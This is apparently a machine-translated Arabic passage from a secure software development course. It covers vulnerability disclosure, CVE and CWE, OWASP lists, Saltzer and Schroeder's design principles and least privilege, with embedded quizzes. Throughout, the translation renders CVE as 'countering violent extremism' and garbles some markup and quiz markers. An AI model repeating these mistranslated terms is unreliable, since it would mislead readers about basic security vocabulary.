سنتحدث كثيرا عن تدابير الحماية. عادة ما يكون منع المشاكل أرخص من التعامل معها لاحقا (تنطبق الأمثال القديمة هنا ، على سبيل المثال ، *"درهم وقاية خير من قنطار علاج").* لكننا سنناقش أيضا تدابير الكشف والاستجابة ، لأنها ضرورية أيضا. على أقل تقدير ، يجب أن تتضمن التطبيقات الأكبر آليات مثل التسجيل (لدعم الكشف) والنسخ الاحتياطي (لدعم الاسترداد) ، لأنها ضرورية في التطبيقات التي ننشرها.

#### الاختبار 1.7: الحماية والكشف والاستجابة

\>\>اختر الإجابة الصحيحة<<

(!) الحماية هي ما يهم في الأمن. إذا كانت حمايتك جيدة بما فيه الكفاية ، فلن تحتاج إلى الكشف أو الاستجابة. {{لا، لأن هناك دائما احتمال حدوث خطأ غير متوقع.}}

( ) الاستجابة هي ما يهم في الأمن؛ لا يمكنك أبدا حماية كل شيء على أي حال ، لذلك ركز فقط على الاستجابة. {{لا، لأنه بدون حماية جيدة سوف تطغى عليك المشاكل.}}

(x) أنت بحاجة إلى الحماية والكشف والاستجابة في الأمان.

### نقاط الضعف

الثغرة الأمنية هي ببساطة فشل في تلبية بعض متطلبات الأمان. عادة ما تكون نقاط الضعف غير مقصودة ، ولكن يمكن أن تكون نقاط الضعف مقصودة. على سبيل المثال ، قد يكون شخص ما قد أدخل عن قصد تعليمات برمجية ضارة (أو على الأقل حاول القيام بذلك) في البرنامج الذي تعيد استخدامه أو تطوره ، مثل الباب الخلفي (طريقة للوصول غير المصرح به) أو القنبلة المنطقية (التعليمات البرمجية التي تؤدي وظيفة ضارة عند استيفاء الشروط المحددة). تركز هذه الدورة بشكل صارم على البرامج ، على الرغم من أن الأجهزة بالطبع يمكن أن تحتوي أيضا على نقاط ضعف.

يعتمد المجتمع الحديث على البرامج (والأجهزة) ، ونتيجة لذلك ، كان هناك نمو هائل في عدد نقاط الضعف المعروفة علنا. وقد جعل هذا من الصعب الإجابة على أسئلة بسيطة مثل ، *"هل أصلحت هذه الثغرة الأمنية بالذات"*؟ بعد ذلك ، سنحدد بعض الجهود التي تم بذلها لتحديد ومعالجة نقاط الضعف المعروفة.

#### الإبلاغ عن نقاط الضعف ومعالجتها - ملخص موجز

هناك العديد من الأشخاص الذين وجدوا ، لسبب أو لآخر ، ثغرات أمنية في البرامج. بعض الناس ، الذين يطلق عليهم الباحثون الأمنيون ، يجعلون العثور على نقاط الضعف جزءا من حياتهم المهنية.

في معظم الحالات ، تقوم مكتشفات الثغرات الأمنية هذه بالإبلاغ عن الثغرة الأمنية إلى مورد (موردي) البرامج من خلال * عملية "الكشف المنسق الموقوت*". يقوم المكتشفون بالإبلاغ بشكل خاص عن الثغرة الأمنية للمورد (الموردين) ، مما يمنح المورد (الموردين) بعض الوقت المحدود (يسمى *"وقت الحظر*") لإصلاح الثغرة الأمنية. بعد وقت الحظر هذا (عادة 14-90 يوما) ، أو عندما يتم إصلاح الثغرة الأمنية وتتاح للمستخدمين فرصة تثبيت الإصدار الذي تمت ترقيته من البرنامج ، يتم الكشف عن الثغرة الأمنية علنا. في بعض الأحيان تسمى  هذه العملية فقط "*الإفصاح المنسق"* ، لكننا نريد أن نوضح بشكل لا لبس فيه أنه في هذه العملية ، سيتم الكشف عن الثغرة الأمنية علنا إذا فشل المورد في إصلاحها في الوقت المناسب.

في الممارسة العملية ، الأمور أكثر تعقيدا. غالبا ما يكون هناك العديد من الموردين وأصحاب المصلحة الآخرين المعنيين. من المهم للغاية أن تستعد (كمطور / مورد) في وقت مبكر حتى يتمكن الأشخاص من الإبلاغ عنك بسهولة عن نقاط الضعف ، حتى تتمكن من مناقشة المشكلة بشكل خاص مع أطراف موثوقة ، وحتى تتمكن من إصلاح أي مشكلات بسرعة. في وقت لاحق من هذه الدورة ، سنناقش كيفية قبول نقاط الضعف والإبلاغ عنها ، بما في ذلك الإشارات إلى المستندات المفيدة حول هذا الموضوع. بالإضافة إلى ذلك ، هناك الكثير من البرامج والعديد من نقاط الضعف التي تحتاج إلى تتبع نقاط الضعف. أدت هذه الحاجة إلى التتبع إلى إنشاء شيء يسمى نقاط الضعف والتعرض الشائعة (CVE).

#### مكافحة التطرف العنيف

نقاط الضعف والتعرض الشائعة (CVE) هو قاموس عالمي (بعض) نقاط الضعف في الأمن السيبراني التي تم الكشف عنها علنا. الهدف من مكافحة التطرف العنيف هو تسهيل مشاركة البيانات حول نقاط الضعف. يحتوي إدخال مكافحة التطرف العنيف على رقم تعريف (معرف) ووصف ومرجع عام واحد على الأقل. تحتوي معرفات مكافحة التطرف العنيف على النموذج CVE-year-number****، حيث  السنة * هي السنة التي تم الإبلاغ عنها والرقم *** هو عدد صحيح موجب تعسفي للتأكد من أن معرفات مكافحة التطرف العنيف فريدة من نوعها. على سبيل المثال، [CVE-2014-0160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160) هي ثغرة  أمنية محددة في OpenSSL (تسمى ثغرة Heartbleed) التي تم الإبلاغ عنها لأول مرة في عام 2014. هناك قواعد بيانات، مثل [قاعدة بيانات الضعف الوطنية الأمريكية (](https://nvd.nist.gov/)[NVD](https://nvd.nist.gov/)[)، ](https://nvd.nist.gov/)التي تتعقب المجموعة العامة الحالية من إدخالات مكافحة التطرف العنيف.

يتم تعيين CVEs من قبل هيئة ترقيم مكافحة التطرف العنيف (CNA). CNA هي ببساطة منظمة مخولة بتعيين معرفات CVE لنقاط الضعف التي تؤثر على المنتجات ضمن نطاق محدد مسبقا. يمكن ل CNA الأساسي (المعروف أيضا باسم "CNA من الملاذ الأخير") تعيين CVE حتى لو لم يتمكن أي شخص آخر من ذلك (يتم شغل هذا الدور حاليا بواسطة [MITRE).](https://www.mitre.org/) العديد من CNAs هم مطورو منتجات برامج (مثل Microsoft و Red Hat) الذين يعينون أرقام CVE لمنتجاتهم الخاصة. هناك أيضا منسقون تابعون لجهات خارجية لنقاط الضعف ، مثل [مركز تنسيق CERT](https://sei.cmu.edu/about/divisions/cert/index.cfm) ، وهم CNAs. يتم إعطاء كل CNA كتلة من الأعداد الصحيحة التي يمكن استخدامها في CVEs. هذا يعني أن CVE-2025-50000 لا يعني أنه رقم الثغرة الأمنية 50,000 في عام 2025 ، ولكن فقط أن CNA الذي خصص معرف CVE هذا مخول بتعيين 50,000 في عام 2025.

لا تحتوي العديد من الثغرات الأمنية المعروفة بشكل عام على تعيينات CVE. بادئ ذي بدء ، يتم تعيين CVEs فقط إذا طلب شخص ما مهمة من CNA ؛ إذا لم يتم تقديم أي طلب ، فلن يكون هناك CVE. بالإضافة إلى ذلك ، فإن مكافحة التطرف العنيف محدودة النطاق عن قصد. يتم منح CVEs فقط للبرامج التي تم إصدارها بشكل عام (بما في ذلك الإصدارات المسبقة إذا كانت مستخدمة على نطاق واسع). لا يتم تعيين CVEs بشكل عام إلى برامج مخصصة لم يتم توزيعها. كما أنها لا يتم تعيينها عادة للخدمات عبر الإنترنت. ومع ذلك ، فإن CVEs هي الطريقة الأكثر استخداما لإعطاء معرف فريد لكل ثغرة أمنية معروفة للجمهور ، لذلك من المهم معرفتها.

#### أهم أنواع نقاط الضعف

يمكن تجميع الغالبية العظمى من نقاط الضعف في فئات. وقد تبين أن ذلك مفيد جدا. بمجرد تحديد الفئات ، يمكننا تحديد الفئات الشائعة والخطوات التي يمكننا اتخاذها لمنع حدوث هذه الأنواع من الثغرات الأمنية مرة أخرى.

 [ تعداد نقاط الضعف الشائعة (CWE)](https://cwe.mitre.org/) هو قائمة طويلة جدا من نقاط الضعف الشائعة. في مصطلحاتهم ، "الضعف" هو فئة (نوع) من الضعف. لاحظ الفرق بين  CVE و CWE: يحدد CWE *نوعا* من الثغرة الأمنية ، بينما يحدد CVE ثغرة *أمنية* معينة  في (عائلة) منتجات معينة. كل CWE لديه معرف مع رقم ، على سبيل المثال ، CWE-20. سنذكر CWE من وقت لآخر. ومع ذلك ، فإن CWE هي قائمة كبيرة ، ولا يمكننا تغطية جميع CWEs في هذه الدورة.

حدد الناس أهم أو أهم أنواع نقاط الضعف من حيث احتمالها وشدتها. اثنتان من القوائم الأكثر شيوعا لأهم أنواع نقاط الضعف هي:

1. [**OWASP Top 10**](https://owasp.org/www-project-top-ten/)<br> تمثل هذه القائمة ، التي طورها مشروع أمان تطبيقات الويب المفتوحة (OWASP) ، *"إجماعا واسعا حول المخاطر الأمنية الأكثر أهمية لتطبيقات الويب". * يطلق عليه أيضا OWASP Top 10 Web Application Security Risk.

2. [**قائمة CWE Top 25**](https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html)<br> هذه قائمة بأكثر أنواع نقاط الضعف انتشارا وخطورة. تم إنشاؤه بواسطة فريق تعداد نقاط الضعف المشتركة (CWE) من خلال تحليل البيانات حول نقاط الضعف المعروفة للجمهور على مدار سنوات عديدة. يمكن تطبيق هذه القائمة على أي برنامج ، ولكن من الشائع بشكل خاص تطبيقها على البرامج التي ليست تطبيق ويب (نظرا لأن قائمة OWASP تركز على تطبيقات الويب). إحدى الغرابة المثيرة للاهتمام: فهي تحدد نقاط الضعف المهمة بعد ال 25 الأولى ، بحيث يمكنك رؤية أرقام أكبر من 25 مرتبطة بهذه القائمة.

يحتوي OWASP على أفضل 10 قوائم أخرى لأنواع مختلفة من البرامج. على سبيل المثال:

* [OWASP موبايل أعلى 10 ](https://owasp.org/www-project-mobile-top-10/) - تطبيقات الهاتف المحمول أعلى 10

* [مشروع OWASP لإنترنت الأشياء ](https://wiki.owasp.org/index.php/OWASP_Internet_of_Things_Project) - إنترنت الأشياء (IoT) أعلى 10.

ومع ذلك ، فإن قائمة أفضل 10 تطبيقات ويب هي أشهر قائمة 10 من OWASP.

نقاط الضعف الرئيسية هذه ليست شائعة فحسب ، بل إنها تميل إلى أن تؤدي إلى نقاط ضعف شديدة.



تتغير هذه القوائم العليا بمرور الوقت. لسوء الحظ ، فإنها لا تتغير كثيرا. كانت العديد من أهم نقاط الضعف في CWE Top 25 هي نفس الأنواع الشائعة من نقاط الضعف لعقود (على سبيل المثال ، انظر *دراسة تخطيط تكنولوجيا أمن الكمبيوتر ، *المجلد الأول[ والمجلد ](https://csrc.nist.gov/csrc/media/publications/conference-paper/1998/10/08/proceedings-of-the-21st-nissc-1998/documents/early-cs-papers/ande72a.pdf)الثاني[ ،  ](https://apps.dtic.mil/dtic/tr/fulltext/u2/772806.pdf)بقلم جيمس ب. أندرسون ، 1972) ، وكانت معظم أهم مشاكل تطبيقات الويب أنواعا شائعة من نقاط الضعف في تطبيقات الويب منذ 1990s. لذلك بينما تتغير الأمور ، فإن التعرف على *أهم* أنواع نقاط الضعف سيكون مفيدا لك لسنوات قادمة.

في أماكن مختلفة طوال الدورة سترى رمز جرس الإنذار . يشير هذا الرمز إلى أن الثغرات الأمنية التي تتم مناقشتها شائعة جدا لدرجة أنها موجودة في قائمة مخاطر أمان تطبيقات الويب 10 ل OWASP و / أو قائمة أفضل 25 CWE.

#### قيمة معرفة أهم أنواع نقاط الضعف

سنقضي الكثير من الوقت في هذه الدورة في مراجعة الأنواع الشائعة من نقاط الضعف. خطر القيام بذلك هو أنك قد تعتقد أن هذا هو كل ما في الأمر لتطوير برامج آمنة. هذا ليس صحيحا.

تجنب الأخطاء الشائعة **_لا_** يكفي ، في حد ذاته ، لجعل البرامج آمنة.

ولكن اعتمادا على كيفية قياس الأشياء ، يتم تغطية نقاط الضعف في أي مكان من 90٪ إلى 99٪ أو أكثر من خلال هذه القوائم العليا. من خلال منع الأخطاء الشائعة ، ستقلل من عدد نقاط الضعف بمقدار كبير على الأقل! وهذا يجعل معرفة - ومواجهة - الأنواع الشائعة من نقاط الضعف ذات قيمة كبيرة ، لأنها ستجعل برنامجك أكثر أمانا. القول *بعدم ارتكاب خطأ أبدا* أمر غير عملي. في المقابل ، من العملي التركيز على تحديد وإدارة أكثر أنواع الأخطاء شيوعا التي تؤدي إلى نقاط الضعف. جزء من سبب شيوع هذه الثغرات هو أن معظم المطورين لا يعرفون ما هي. معرفة ما هي عليه هو الخطوة الأولى لإدارتها.

تحديد الأنواع الشائعة من نقاط الضعف له ميزة أخرى أيضا: سيساعدك على تحديد أنواع أخرى من نقاط ** الضعف. كما لاحظنا بالفعل ، لا يوجد بديل للتفكير. لكن العديد من المطورين يجدون صعوبة في عرض أنظمتهم مثل المهاجم. من خلال النظر إلى الأنواع الشائعة من نقاط الضعف في الماضي ، يمكنك أن تصبح أكثر حساسية لنقاط الضعف بشكل عام. لذلك في حين أن معرفة الأنواع الشائعة من نقاط الضعف لا *تحل محل* التفكير ، فإن معرفتها يمكن أن *تساعدك على* التفكير.

#### اختبار 1.8: نقاط الضعف

\>\>اختر العبارة الحقيقية<<

(!) يتم تعيين معرفات CVE لجميع الثغرات الأمنية المعروفة بشكل عام. {{لا، يجب على شخص ما طلب معرف مكافحة التطرف العنيف. بالإضافة إلى ذلك، يتم منح مكافحة التطرف العنيف فقط للبرامج التي تم إصدارها علنا (بما في ذلك الإصدارات المسبقة إذا كانت مستخدمة على نطاق واسع). لا يتم تعيين CVEs بشكل عام إلى برامج مخصصة لم يتم توزيعها. كما أنها لا يتم تعيينها عادة للخدمات عبر الإنترنت.}}

( ) يتم تعيين جميع CVEs من قبل شركة MITRE. {{لا، يتم تعيين CVEs من قبل "هيئة ترقيم مكافحة التطرف العنيف" (CNA.)}}

(خ) إن تجنب الأنواع الشائعة من مواطن الضعف لا يكفي في حد ذاته لجعل البرمجيات آمنة، ولكنه يمكن أن يكون عونا كبيرا.

# تصميم

يصف هذا الفصل كيفية تصميم البرامج لتكون آمنة ، مع التركيز على مبادئ التصميم الآمن الرئيسية مثل الامتياز الأقل ، والوساطة الكاملة ، والتحقق من صحة الإدخال.

أهداف التعلم:

1. اشرح ما هي مبادئ التصميم الآمن وقدم أمثلة لبعض المبادئ الرئيسية المقبولة على نطاق واسع.

2. ناقش مفهوم الامتياز الأقل.

3. ناقش الوساطة الكاملة ("عدم الالتفافية") ، بما في ذلك الأخطاء الشائعة.

4. فهم التحقق من صحة الإدخال في بيئة يمكنك الوثوق بها.

5. ناقش مبادئ التصميم الآمن الأخرى المقبولة على نطاق واسع ، لا سيما تلك التي حددها سالتزر وشرودر.

## أساسيات التصميم الآمن

### ما هي مبادئ التصميم الأمني؟

عندما تكتب برامج غير تافهة ، يجب عليك تقسيم المشكلة إلى مكونات أصغر تعمل معا. تسمى عملية تحديد كيفية تقسيم المشكلة إلى مكونات وكيف ستعمل معا التصميم ** أو *التصميم المعماري*. على سبيل المثال ، أنت تصمم عندما تحاول تحديد كيفية تقسيم مشكلة إلى مجموعة معينة من الفئات والأساليب. تسمى نتيجة هذه القرارات أيضا التصميم أو التصميم المعماري. تستخدم كلمة "تصميم" أيضا لوصف تصميم واجهة المستخدم ، ولكن هذا ليس المعنى الذي نعنيه هنا.

تذكر أن عملية التصميم ، مثل أي عملية تطوير برامج أخرى ، لا تحدث مرة واحدة فقط. من الشائع حقا محاولة تنفيذ بعض البرامج ، وإدراك أن التصميم لا يعمل ، ثم تغيير التصميم. غالبا ما يتعين عليك تغيير التصميم عند تغيير ما يفعله البرنامج. لذلك تحدث عملية التصميم عندما تفكر في تغيير كيفية تقسيم المشكلة في برنامجك.

بعض التصميمات أفضل من غيرها: بعضها أسهل في الصيانة وأسرع وما إلى ذلك. على وجه الخصوص ، بعض التصاميم أكثر أمانا من التصاميم الأخرى. لا توجد خدعة سحرية تضمن أن تصميمك آمن. لكن الناس يطورون البرامج منذ عقود ، ومن خلال التجربة ، حددوا مجموعة من *مبادئ التصميم* التي يمكن أن تساعدك في اختيار التصميمات الجيدة على التصميمات السيئة.

مبادئ التصميم هي أدلة دقيقة على نطاق واسع تستند إلى الخبرة والممارسة. بعبارة أخرى ، مبادئ التصميم هي قواعد أساسية لمساعدتك على تجنب التصميم السيئ بسرعة وإرشادك إلى تصميم جيد بدلا من ذلك. مبادئ التصميم الآمن لا تضمن الأمن ، على الرغم من ذلك. إنها مساعدة للتفكير ، وليست بديلا عن التفكير. على سبيل المثال ، في بعض الأحيان لن يتم تطبيق مبدأ على الإطلاق. في بعض الأحيان تتصادم المبادئ. على سبيل المثال ، أحد مبادئ التصميم الآمن هو إبقاء الأمور بسيطة ، ولكن في بعض الأحيان تحتاج إلى مزيد من التعقيد لإنجاز شيء آخر. في حالات نادرة ، قد تكون هناك أسباب وجيهة من وجهة نظر أمنية لانتهاك المبدأ تماما. ومع ذلك ، سيكون برنامجك أكثر أمانا بشكل عام إذا فكرت في مبادئ التصميم الآمن وحاولت تطبيقها. مبادئ التصميم الآمن هي حكمة مقطرة ، وسيكون من الحكمة النظر فيها.

عند التفكير في التصميم الخاص بك ، تحتاج إلى التفكير في المكونات التي يمكنك الوثوق بها (ومقدارها) ، والمكونات التي لا يمكنك الوثوق بها بالضرورة. تتحدث بعض مبادئ التصميم عن *حدود الثقة*. حدود الثقة هي ببساطة الحد الفاصل بين المكونات التي تثق بها والمكونات التي لا تثق بها بالضرورة. يعتمد مكان حدود الثقة على البرنامج الذي تقوم بتطويره:

* إذا كنت تكتب تطبيقا من جانب الخادم ، فمن المفترض أنك تثق في ما تقوم بتشغيله (على سبيل المثال ، الكمبيوتر ونظام التشغيل ووقت تشغيل الحاوية إن وجد) ، ولكن ليس أنظمة العميل الخارجية (التي قد يتحكم في بعضها مهاجم). حدود الثقة بين الخادم والعملاء.

* إذا كنت تكتب تطبيقا للهاتف المحمول (الهاتف الذكي) يتحدث إلى خادم تتحكم فيه ، فمن المفترض أنك تثق في هذا الخادم البعيد. يجب ألا تثق في مسار الاتصال بين تطبيق الهاتف المحمول والخادم (لذلك ستحتاج إلى استخدام TLS لتشفيره). بالتأكيد يجب ألا تثق في التطبيقات الأخرى على الهاتف الذكي ، إلا إذا كان لديك سبب خاص للثقة في أحدها. من الواضح أن هناك حدودا بين تطبيق الهاتف المحمول الخاص بك و (1) الإنترنت العام و (2) تطبيقات الهاتف المحمول الأخرى. الثقة في كثير من الأحيان ليست مطلقة. ربما تثق في أن نظام تشغيل الهاتف الذكي المحمول سيعمل لهذا المستخدم ، ولكن قد يكون هذا المستخدم مهاجما ، لذلك ربما يجب عليك التأكد من أن بعض الأسرار لن تدخل أبدا في تطبيق الهاتف المحمول على الإطلاق.

#### اختبار 2.1: ما هي مبادئ تصميم الأمن؟

\>\>إذا اتبعت مبادئ التصميم الآمن ، فستنشئ دائما برنامجا آمنا. صواب أم خطأ؟<<

(!) صحيح

(x) خطأ

[تفسير]

للأسف ، اتباع مبادئ التصميم الآمن لا يضمن البرامج الآمنة. بدلا من ذلك ، فهي مجرد دليل قيم لهذا المسار. ما زلت بحاجة إلى *التفكير*.

[تفسير]

### مبادئ التصميم الآمن الموصى بها على نطاق واسع

تعرضت البرمجيات للهجوم منذ عقود ، وتم تحديد العديد من مبادئ التصميم الآمن الرئيسية في عام 1975 من قبل جيروم إتش سالتزر ومايكل دي شرودر (S & S) في ورقتهما البحثية ، [*حماية المعلومات في أنظمة الكمبيوتر*](http://web.mit.edu/Saltzer/www/publications/protection/index.html). ما هو عظيم في قائمتهم هو أنها صمدت أمام اختبار الزمن. هذه المبادئ لا تقل أهمية اليوم. تم تحديد مبادئ أخرى منذ ذلك الحين ، ولكن لنبدأ بقائمتهم.

في قائمتهم يركزون على *نظام الحماية* - أي جزء النظام الذي يعتمد عليه الأمان. فيما يلي قائمتهم ، إلى جانب بعض الأسماء البديلة:

1. **أقل امتياز**<br>يجب أن يعمل كل مستخدم (بشري) وبرنامج باستخدام أقل عدد ممكن من الامتيازات. يحد هذا المبدأ من الضرر الناجم عن حادث أو خطأ أو هجوم. كما أنه يقلل من عدد التفاعلات المحتملة بين البرامج ذات الامتيازات ، لذلك تقل احتمالية حدوث استخدامات غير مقصودة أو غير مرغوب فيها أو غير لائقة للامتياز.

2. ** الوساطة الكاملة (ويعرف أيضا باسم عدم التجاوز) **<br> يجب التحقق من كل محاولة وصول ؛ ضع الآلية بحيث لا يمكن تخريبها. مرادف لهذا الهدف هو عدم التجاوز.

3. ** اقتصاد الآلية (المعروف أيضا باسم البساطة) **<br> يجب أن يكون النظام ، ولا سيما الجزء الذي يعتمد عليه الأمن ، بسيطا وصغيرا قدر الإمكان.

4. **تصميم مفتوح**<br>يجب ألا تعتمد آلية الحماية على جهل المهاجم. بدلا من ذلك ، يجب أن تتصرف كما لو كانت الآلية معروفة للجمهور ، وبدلا من ذلك تعتمد على سرية عدد قليل نسبيا من العناصر القابلة للتغيير بسهولة مثل كلمات المرور أو المفاتيح الخاصة. يجب ألا يكون المهاجم قادرا على اقتحام النظام لمجرد أن المهاجم يعرف كيف يعمل. "الأمن من خلال الغموض" عموما لا يعمل.

5. **الإعدادات الافتراضية الآمنة**<br>من الفشل يجب أن يكون التثبيت الافتراضي هو التثبيت الآمن. إذا لم يكن من المؤكد أنه يجب السماح بشيء ما ، فلا تسمح به.

6. **فصل الامتياز (على سبيل المثال، استخدام المصادقة ذات العاملين)**<br> يجب أن يعتمد الوصول إلى الكائنات على أكثر من شرط واحد (مثل وجود كلمة مرور). بهذه الطريقة ، إذا تمكن المهاجم من كسر شرط واحد (على سبيل المثال ، عن طريق سرقة مفتاح) ، يظل النظام آمنا. ملاحظة: في بعض الأحيان يتم تقسيم البرامج إلى أجزاء ، كل جزء بامتياز مختلف. يطلق على هذا النهج أحيانا اسم "فصل الامتيازات" - ولكن تقسيم البرنامج إلى أجزاء بامتيازات مختلفة شيء آخر. في هذا المصطلح ، هذا مثال على أقل امتياز.

7. ** الآلية الأقل شيوعا (ويعرف أيضا باسم تقليل المشاركة) ** تقليل<br> كمية واستخدام الآليات المشتركة. تجنب مشاركة الملفات أو الدلائل أو تنفيذ نواة نظام التشغيل أو أجهزة الكمبيوتر مع شيء لا تثق به ، لأن المهاجمين قد يستغلونها.

8. ** القبول النفسي (المعروف أيضا باسم سهل الاستخدام) **<br> يجب تصميم الواجهة البشرية لسهولة الاستخدام حتى يستخدم المستخدمون آليات الحماية بشكل روتيني وتلقائي بشكل صحيح.

منذ ذلك الحين ، تم تحديد مبادئ التصميم الآمن الأخرى من قبل أشخاص مختلفين. سنغطي عددا قليلا من هؤلاء طوال الدورة.

تذكر أن مبادئ التصميم هي ببساطة قواعد أساسية. أثناء تقسيم مشكلتك لحلها ، يجب أن تفكر في هذه المبادئ ، لأنها ستساعد في إرشادك إلى إنشاء برامج أكثر أمانا. هناك بعض الحالات التي سيكون لديك فيها أسباب وجيهة *لعدم* تطبيقها. هذه المبادئ لا تحل محل التفكير - فهي تساعد في *إرشادك* عندما تفكر.

بعد ذلك ، سننظر بمزيد من التفصيل في عدد قليل من هذه المبادئ ، لأن لها تداعيات قد لا تكون واضحة. في الوحدة التالية سنبدأ بالنظر إلى *الامتياز على الأقل*.

#### الاختبار 2.2: مبادئ التصميم الآمن الموصى بها على نطاق واسع

\>\>إذا حافظنا على سرية كيفية عمل النظام ، فسيكون النظام آمنا. صواب أم خطأ؟<<

( ) صحيح

(x) خطأ

[تفسير]

ينص مبدأ "التصميم المفتوح" على أنه لا يمكننا الاعتماد على المهاجمين الذين لا يعرفون كيف يعمل النظام. بدلا من ذلك ، نحتاج إلى تصميم أنظمتنا بحيث تظل آمنة حتى عندما يعرف المهاجم بالضبط كيف يعمل.

[تفسير]

### أقل امتياز

لقد لاحظنا بالفعل أن الامتياز الأقل هو مبدأ تصميم آمن مهم. الفكرة الأساسية هي أن كل مستخدم (بشري أو برنامج) يجب أن يعمل باستخدام أقل عدد ممكن من الامتيازات. بشكل عام ، لا تسمح بقراءة المعلومات أو كتابتها إلا إذا كنت بحاجة إلى القيام بذلك لهذا المستخدم.

يحد الامتياز الأقل من الضرر المحتمل من الهجوم ، كما يقلل من تعقيد التفاعلات المتعلقة بالأمان. يمتد هذا حتى إلى الأجزاء الداخلية للبرنامج: فقط الجزء الأصغر من البرنامج الذي يحتاج إلى امتيازات يجب أن يكون (من الناحية المثالية) الحصول عليها. بالطبع ، في مرحلة ما ، يصبح هذا الأمر معقدا للغاية (ونريد أيضا إبقاء البرنامج بسيطا قدر الإمكان).

#### طرق تنفيذ أقل امتياز

فيما يلي عدة طرق لتنفيذ أقل امتياز ، اعتمادا على الظروف:

1. ** لا تمنح البرنامج أي امتيازات خاصة (حيثما كان ذلك عمليا) ** <br>إذا كان من الممكن القيام بذلك ، فافعل ذلك ، لأن هذا هو الأفضل من وجهة نظر أمنية. على سبيل المثال ، يدعم Linux إنشاء برامج **setuid** أو **setgid** ، بحيث يمنح تشغيل البرنامج ببساطة البرنامج امتيازات مالكه. إذا كان بإمكانك تجنب استخدام هذه الآلية تماما ، ففكر في القيام بذلك ، لأنها تمنح امتيازات خاصة للبرامج. غالبا ما تكون هناك بدائل أكثر أمانا. على سبيل المثال ، مطالبة الأشخاص بتسجيل الدخول على وجه التحديد بامتيازات (هذا هو الغرض من **sudo**).

2. **قلل من الامتيازات الخاصة التي يحصل عليها البرنامج ، بما في ذلك تقليل أي بيانات يمكن الوصول إليها**<br>على نظام Linux ، قد يكون لديك برنامج أدناه (أو يعمل نيابة عن) مجموعة خاصة أو مستخدم لديه حقوق محددة فقط ، بدلا من شيء أكثر امتيازا (مثل الجذر). إذا كنت تستدعي واجهة استعلام نظام قاعدة بيانات، فقم بتقييد حقوق مستخدم قاعدة البيانات الذي يستخدمه التطبيق. إذا كان نظام قاعدة البيانات الخاص بك يستخدم SQL ، فقد تتمكن من استخدام الأمر SQL GRANT للحد من الامتيازات التي يحصل عليها البرنامج. قد يستخدم مستخدمو Redis أمر Redis ACL الخاص ب Redis للحد من الامتيازات.

3. **التخلي نهائيا عن الامتيازات في أقرب وقت ممكن **<br>على سبيل المثال ، إذا كنت تستخدم معرفات المجموعة المحفوظة في Linux أو معرفات المستخدم أو القدرات ، فقم بإسقاط هذه الامتيازات الإضافية نهائيا في أقرب وقت ممكن. بهذه الطريقة ، إذا حدث الهجوم بعد ذلك ، فلن يتمكن المهاجم من استغلال هذه الامتيازات.

4. **إذا لم تتمكن من التخلي عن الامتيازات بشكل دائم ، فحاول تقليل الوقت الذي يكون فيه الامتياز نشطا**<br>هذا أقل فعالية ، لأن بعض الهجمات يمكن أن تجبر البرامج على تشغيل تعليمات برمجية عشوائية. لكن بعض الهجمات يمكن أن تجعل البرامج تقوم بعدد محدود من الأشياء فقط ، كما أن التقليل عندما يكون الامتياز نشطا سيقلل مما يمكن للمهاجم القيام به.

5. ** قسم البرنامج إلى وحدات مختلفة ، وامنح امتيازات خاصة لوحدة واحدة فقط أو بضع وحدات (أجزاء من البرنامج) ** من <br>الناحية المثالية ، لن تثق الوحدة المميزة بشكل كامل في الأجزاء الأخرى من برنامجك (ويعرف أيضا باسم *التصميم المشبوه بشكل متبادل*). إذا قمت بذلك ، فعندئذ إذا تم تخريب جزء من برنامجك ، فسوف يحد ذلك مما يمكن للمهاجم فعله على الفور. على سبيل المثال، يمكنك تقسيم جزء البرنامج الذي ينفذ واجهة المستخدم الرسومية من جزء مختلف بامتيازات. يمكن أن تساعدك آليات الفصل مثل الحاويات والأجهزة الافتراضية و Linux seccomp وأنواع مختلفة من أغلفة الأمان في فصل أجزاء من برنامجك بحيث لا يؤدي تخريب جزء واحد بالضرورة إلى كسر جزء آخر. **_احذر:_** *تأكد من تكوين هذه الآليات لفصل الوحدات بشكل آمن ، والحد من الامتيازات في كل جزء.*  غالبا ما تكون آليات الفصل هذه غير مضمونة ، لذلك لا تفترض أن استخدامها تلقائيا يجعل برنامجك آمنا. ومع ذلك ، يمكنهم جعل برنامجك أكثر صعوبة في الهجوم وقد يقلل من الضرر إذا نجح الهجوم.

6. **تصغير (حد) سطح الهجوم سطح**<br> *الهجوم* هو مجموعة العمليات (على سبيل المثال ، واجهة برمجة التطبيقات الخاصة به ومنافذ الشبكة المفتوحة الخاصة به) التي يمكن للمهاجم المحتمل الوصول إليها. على سبيل المثال ، إذا سمحت بالوصول العام إلى طريقة ما ، فأنت تمنح جميع المهاجمين حق الوصول إلى هذه الطريقة - هل أنت متأكد من أنك بحاجة إلى ذلك؟ حيثما أمكن ، حدد العمليات التي يمكن للمهاجم المحتمل الوصول إليها. إذا كان الجمهور لا يحتاج إلى الوصول ، فلا تمنح الجمهور حق الوصول. على وجه الخصوص ، تجنب ترك عمليات تصحيح الأخطاء في أنظمة الإنتاج التي يمكن للمهاجم الوصول إليها ؛ تعد عمليات تصحيح الأخطاء مصدرا شائعا للمشاكل.

7. **التحقق من صحة (تحقق) الإدخال قبل قبوله**<br>لا تقبل البيانات من مهاجم محتمل فحسب ؛ تحقق منها جيدا قبل قبولها. سنناقش التحقق من صحة المدخلات بمزيد من التفصيل لاحقا. بالطبع ، تحتاج إلى التأكد من أن المهاجمين لا يمكنهم تجاوز التحقق من صحة الإدخال هذا ؛ هذه قضية كبيرة لدرجة أن لها مبدأها الخاص  ، *الوساطة الكاملة *، ويعرف أيضا باسم *عدم الالتفافية*. سنتحدث عن ذلك بعد ذلك.

8. **وضع الحماية لبرنامجك**<br>قم بتشغيل البرنامج عن قصد (أو جزء منه) في بيئة ذات قدرات مقيدة عن قصد.

9. **تقليل امتيازات الملفات والموارد الأخرى**<br>على سبيل المثال ، عادة لا ينبغي أن يكون لديك ملفات قابلة للكتابة من قبل الجميع (حتى يمكن قراءتها من قبل الجميع غالبا ما تكون مشكوك فيها). على Android ، يمكن تغيير ملف قابل للكتابة من قبل الجميع بواسطة تطبيق مختلف (ربما ضار).

<br>

